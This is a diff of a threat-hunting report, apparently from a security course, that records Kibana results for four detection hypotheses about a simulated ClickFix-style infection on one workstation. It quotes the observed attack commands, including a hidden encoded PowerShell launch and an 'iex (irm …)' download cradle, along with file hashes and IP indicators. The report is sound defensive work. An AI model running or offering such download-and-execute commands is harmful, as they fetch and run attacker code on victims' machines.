@@ -52,13 +52,33 @@ not process.parent.name : "ccmexec.exe"
 
 <img width="1200" height="600" alt="hunt_results (1)" src="https://github.com/user-attachments/assets/27c12ba2-e078-4564-b5f0-5a7a54281718" />
 
-Hypothesis 1
+Hypothesis 1 - PowerShell with hidden window / encoded command / download cradle
+
+Result: 2 events on WS-04 (user madina). Both come from the injected ClickFix-like chain:
+
+powershell.exe -w hidden -nop -enc ... started by explorer.exe (Oct 5, 2026 @ 18:00:07), the command a user pastes from a fake "update" page;
+powershell.exe -c iex (irm https://example.invalid/update.ps1) started by powershell.exe (18:01:55), a download cradle.
+
+The legitimate admin script (ccmexec.exe parent) was excluded by the query. This confirms stage 4 (Exploitation) of the Kill Chain, T1059.001.
 <img width="1280" height="689" alt="photo_5352961012983865796_y (1)" src="https://github.com/user-attachments/assets/5ab2dc5a-cdb3-44ab-83df-e4f0570cf896" />
-Hypothesis 2
+Hypothesis 2 - Executable from Temp/AppData started by PowerShell
+
+Result: 0 events in Kibana. The query process.command_line : (*\\AppData\\* or *\\Temp\\*) returned "No results match your search criteria".
+
+Important note: this is a limitation of the query, not proof that the activity is absent. process.command_line is an analyzed text field, so Windows paths are split into tokens and wildcards with backslashes do not match. The event does exist: hunt H4 (below) shows C:\Users\madina\AppData\Local\Temp\lf3t32pa.exe with parent powershell.exe at 18:02:43, and our Python hunt (run_hunt.py) finds it. Planned fix: query by tokens (process.command_line : (Temp or AppData)) or map the field as keyword.
 <img width="1280" height="692" alt="image" src="https://github.com/user-attachments/assets/0e71a302-db7d-4155-afcb-ea5b16f4197e" />
-Hypothesis 3
+Hypothesis 3 - Dead Drop Resolver lookups by a non-browser process
+
+Result: 2 events on WS-04. Process lf3t32pa.exe (user madina) resolved steamcommunity.com (18:03:29) and telegram.me (18:03:44), Sysmon event 22. Browsers, Steam and Telegram clients were excluded, so ordinary lookups of the same domains are not reported. This matches the Dead Drop Resolver technique T1102.001 (Kill Chain stage 6, C2).
 <img width="1280" height="690" alt="image" src="https://github.com/user-attachments/assets/9cd4123d-bd24-4e70-a43a-ddefa9b49c55" />
-Hypothesis 4
+Hypothesis 4 - Known IOCs (intel-driven)
+
+Result: 2 events on WS-04. The query used the SHA256 e93511363f7781c4c7ff3ed0698db6c4634092fe7e93ca96d666509a9412e73e and the IP 31.59.44.104 from our Week 2 research:
+
+the file with this hash was executed as C:\Users\madina\AppData\Local\Temp\lf3t32pa.exe, parent powershell.exe (18:02:43);
+the same process connected to 31.59.44.104:80 (18:04:26).
+
+Note: in our dataset 31.59.44.104 is a low-confidence candidate (to_ids = False), so this hit is a watchlist signal, not a confirmed C2. The longer lists generated from the whole dataset are in hunt_queries/h4_ioc_kql.md.
 <img width="1280" height="690" alt="image" src="https://github.com/user-attachments/assets/d9fbce5d-6928-456d-a3ca-98abc18c6b2c" />
 
 ### Telemetry Artifact Example (Kibana Discover Snippet)
